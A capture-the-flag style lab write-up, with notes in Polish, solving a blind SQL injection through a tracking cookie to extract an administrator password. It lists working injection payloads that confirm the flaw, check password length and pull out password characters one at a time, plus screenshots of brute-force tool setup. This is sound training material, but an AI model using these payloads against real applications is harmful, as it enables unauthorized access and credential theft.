Title: Blind SQL injection with conditional responses
Level: Practitioner
Desc:  This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.
The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
To solve the lab, log in as the administrator user. 

Weryfikacja składni wstrzyknięcia SQL:
payload: `TrackingId=TM5MCwVsGuorQPJ7' and (SELECT 'a' FROM users LIMIT 1)='a`
![image](https://github.com/user-attachments/assets/896d4902-baf1-48a4-b897-6abb14d67f04)
JEST Welcome

Weryfikacja składni, ale w szczególności istnienia konta administrator w tabeli users:
payload: `TrackingId=TM5MCwVsGuorQPJ7' and (SELECT username FROM users where username='administrator' LIMIT 1)='administrator`
![image](https://github.com/user-attachments/assets/93c45fb3-dd8d-4c89-8370-caf7579b33fd)
JEST Welcome

Weryfikacja długości wyciąganego łańcucha znaków, tutaj hasła:
payload: `TrackingId=TM5MCwVsGuorQPJ7' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a`
![image](https://github.com/user-attachments/assets/3b1e9c38-2b7c-40f0-9d00-3a681c936cb8)
JEST welcome

Pobieranie znaków z hasła:
payload: `TrackingId=TM5MCwVsGuorQPJ7' and SUBSTRING((SELECT password FROM users where username='administrator'),1,1)='7`
![image](https://github.com/user-attachments/assets/b26c3167-b57f-4d0c-81af-9fec71c894c1)
JEST Welcome

Konfiguracja Intrudera:
Na pobieranie znak po znaku:
![image](https://github.com/user-attachments/assets/b76e9818-d3c9-47e1-a61c-f799b8c33877)
![image](https://github.com/user-attachments/assets/d0de6d4a-8dd5-47b1-bde4-12e53d164ab9)

Na cluster bomb:
![image](https://github.com/user-attachments/assets/ab3fb0cf-c35a-45c7-bc9e-8c60ea6b629d)
![image](https://github.com/user-attachments/assets/d2c514d2-927a-4335-9bf1-a3548025920e)
![image](https://github.com/user-attachments/assets/d9799f90-982f-49ae-81c9-c653d852c9c2)


Results: 
![image](https://github.com/user-attachments/assets/e0c8c863-951f-4bda-884f-0a3e64b22d8f)








